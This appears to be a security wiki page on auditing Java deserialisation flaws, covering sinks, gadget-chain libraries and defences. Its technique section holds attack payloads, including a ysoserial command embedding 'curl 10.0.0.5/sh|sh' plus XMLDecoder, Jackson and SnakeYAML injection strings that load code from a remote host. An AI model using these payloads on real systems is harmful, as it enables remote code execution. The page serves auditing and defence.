---
title: Java deserialisation audit
slug: java-deserialization-audit
---

> **TL;DR:** Find any sink that deserialises attacker-controlled bytes through `ObjectInputStream`, `XMLDecoder`, `XStream`, Jackson default-typing, SnakeYAML or Kryo, then check the classpath for a known gadget chain. ysoserial generates payloads for the common chains.

## What it is
Java's native serialisation runs `readObject()` callbacks during stream parsing. A "gadget chain" is a path through library classes whose `readObject` / `readResolve` / `finalize` / `equals` triggers further calls that culminate in `Runtime.exec` or `Method.invoke`. The vulnerable code does not need to call `exec` — it just needs to deserialise into a classpath containing a chain.

## Preconditions / where it applies
- A sink that consumes untrusted bytes into a Java deserialiser
- Classpath contains a library with a published gadget — Commons-Collections 3.x, Commons-Beanutils 1.x, Spring-Core/AOP, Groovy < 2.4.4, Hibernate 3/4/5 with `BasicPropertyAccessor`, ROME 1.0
- For non-native sinks: Jackson < 2.10 with `enableDefaultTyping`; XStream < 1.4.18; SnakeYAML pre-2.0 with default constructor; XMLDecoder always; Kryo with `setRegistrationRequired(false)`

## Technique
1. **Find sinks** via [[source-sink-flow-analysis]]:
```
ObjectInputStream.readObject | readUnshared
XMLDecoder(stream).readObject
XStream.fromXML
ObjectMapper with enableDefaultTyping() or @JsonTypeInfo(use=Id.CLASS)
new Yaml().load                     // pre-2.0 default Constructor
new Kryo()/kryo.readClassAndObject  // if !registrationRequired
javax.management RMI / JMX endpoints  // deserialises on the wire
```
2. **Inventory the classpath.** `unzip -l app.war | grep '\.jar$'` then map versions. The ysoserial `payloads/` directory documents which chain works against which library version.
3. **Generate payload:**
```bash
java -jar ysoserial.jar CommonsCollections6 "curl 10.0.0.5/sh|sh" > p.bin
java -jar ysoserial.jar Spring1 "id" > p.bin
java -jar ysoserial.jar Hibernate1 "id" > p.bin
```
4. **Wire the payload** to the sink:
   - HTTP body to a Java endpoint that calls `readObject` (raw, or via `viewstate`-style param)
   - `Cookie` with base64-serialised Java object (some legacy frameworks store session this way)
   - JMS, RMI registry, T3 (WebLogic), IIOP
   - `Content-Type: application/x-java-serialized-object`
5. **Non-native sinks**:
   - XMLDecoder: post raw XML — `<java><object class="java.lang.Runtime" method="getRuntime"><void method="exec"><array class="java.lang.String" length="3"><void index="0"><string>sh</string>...`
   - Jackson default-typing: `["org.springframework.context.support.ClassPathXmlApplicationContext","http://x/poc.xml"]`
   - SnakeYAML: `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://x/"]]]]`
6. **Blind detection.** Send `aced0005` magic-byte payload (Java serial header) that triggers DNS callback via URLDNS chain:
```bash
java -jar ysoserial.jar URLDNS "http://x.oastify.com" | base64
```

## Detection and defence
- Replace native serialisation with JSON / Protobuf where possible
- Apply JEP 290 `ObjectInputFilter` — allowlist concrete classes:
```java
ObjectInputFilter.Config.setSerialFilter(
  ObjectInputFilter.Config.createFilter("com.acme.*;!*"));
```
- Use `SerialKiller` or `NotSoSerial` agents on legacy apps where you cannot recompile
- Jackson: never call `enableDefaultTyping`; if polymorphism required, register a `PolymorphicTypeValidator` with concrete allowlist
- Monitor for `aced 0005` magic bytes in HTTP bodies + alerts on long base64 strings to backend endpoints
- See [[php-deserialization-gadgets]] for the equivalent in PHP and [[dangerous-java-sinks]] for the wider sink catalogue

## References
- [ysoserial](https://github.com/frohoff/ysoserial) — canonical gadget generator and chain documentation
- [PortSwigger — Java deserialization](https://portswigger.net/web-security/deserialization/exploiting) — exploitation tutorial
- [Foxglove Security — deserialisation primer](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/) — original disclosure paper
- [JEP 290](https://openjdk.org/jeps/290) — filter-incoming-serialization-data
